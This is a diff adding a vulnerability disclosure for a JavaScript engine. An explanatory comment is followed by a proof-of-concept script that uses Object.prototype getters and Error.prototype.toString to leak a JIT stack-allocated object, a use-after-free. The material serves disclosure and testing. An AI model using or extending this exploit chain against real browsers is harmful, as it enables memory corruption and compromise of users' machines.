@@ -1,0 +1,35 @@
+/*
+The JsBuiltInEngineInterfaceExtensionObject::InjectJsBuiltInLibraryCode method is used to execute JsBuiltIn.js which initializes some builtin objects. Because it's essentially written in JavaScript, it needs to clear the disable-implicit-call flag before calling the JavaScript code, otherwise it might not work properly. The problem is, it doesn't restore the prevous status of the flag after the call. As setting the flag can prevent stack-allocated objects from leaking, this clearing-the-flag bug can lead to a stack-based use-after-free.
+
+To exploit this bug, it's needed to build a chain that first clears the flag by calling the vulnerable method and then leaks the stack-allocated object. This is done with the Error.prototype.toString method (marked as having no side effects) which calls the "toString" method on the "name" property and the "message" property of the "this" object. So when it accesses the "name" property, it clears the flag and leaks the "this" object when it accesses the "message" property.
+
+PoC:
+*/
+
+function opt() {
+    let o = {};  // stack-allocated object
+    o.x;  // under with DisableImplicitFlags set
+}
+
+function main() {
+    for (let i = 0; i < 10000; i++) {
+        opt();
+    }
+
+    let leaked_stack_object = null;
+    let object_prototype = ({}).__proto__;
+    object_prototype.__defineGetter__('x', Error.prototype.toString);
+    object_prototype.__defineGetter__('message', function () {
+        delete object_prototype.message;
+
+        leaked_stack_object = this;
+    });
+
+    object_prototype.name = Array.prototype;  // access to Array.prototype will call JsBuiltInEngineInterfaceExtensionObject::InjectJsBuiltInLibraryCode.
+
+    opt();
+
+    alert(leaked_stack_object);
+}
+
+main();
